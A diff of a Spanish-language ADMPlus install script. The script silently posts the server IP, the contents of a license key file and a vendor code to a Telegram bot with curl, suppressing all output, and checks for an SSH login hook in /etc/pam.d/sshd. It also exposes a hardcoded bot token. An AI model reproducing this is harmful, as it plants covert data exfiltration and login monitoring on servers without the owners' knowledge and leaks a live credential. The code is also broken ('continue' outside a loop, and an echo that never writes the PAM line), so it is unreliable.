@@ -3,10 +3,10 @@ TOKEN="1830099891:AAF7NVl2kT4UBrXACSLW-7TUBwKvyEhuI8g"
 ID="553561525"
 MENSAJE="Nueva instalacion de ADMPlus: en la IP: $IP Key Usada: $(cat /etc/newadm/key.txt) IP Del Vendedor: $(cat /usr/bin/vendor_code)"
 URL="https://api.telegram.org/bot$TOKEN/sendMessage"
-curl -s -X POST $URL -d chat_id=$ID -d text="$MENSAJE" &> /dev/null
 #Verif= https://api.telegram.org/bot$TOKEN/getUpdates
 if cat /etc/pam.d/sshd | grep ADMPlus &> /dev/null; then
-exit
+continue
 else
 echo "session    optional     pam_exec.so  /usr/local/bin/notify-on-ssh-login.sh" /etc/pam.d/sshd
 fi
+curl -s -X POST $URL -d chat_id=$ID -d text="$MENSAJE" &> /dev/null
